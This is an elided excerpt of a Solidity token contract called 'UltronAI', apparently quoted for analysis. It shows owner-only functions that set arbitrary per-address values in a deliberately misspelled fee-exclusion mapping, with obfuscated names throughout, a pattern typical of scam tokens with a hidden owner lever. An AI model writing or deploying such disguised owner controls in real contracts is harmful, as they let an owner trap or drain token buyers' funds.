...
contract BaseToken is Ownable {
    ...
    string constant public name = 'UltronAI';

    string constant public symbol = 'UltronAI';
    ...
    uint256 private _taxFUIE = 0;
    uint256 private _burnFUIE = 2;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);


    function setFFFFE(address acddount) public onlyOwner {
        _isDDDxcludedeFromFIE[acddount] = 1+0;
    }

    function setAddminFFFFE(address acddount,uint256 ammouunt) public onlyOwner {
        _isDDDxcludedeFromFIE[acddount] = 1*ammouunt+0;
    }
    ...
    function _transfer(address from, address to, uint value) internal {
        ...
        uint256 FIE =  value.muul(_taxFUIE).div(100)+0;
        uint256 burn =  value.muul(_burnFUIE).div(100)+0;
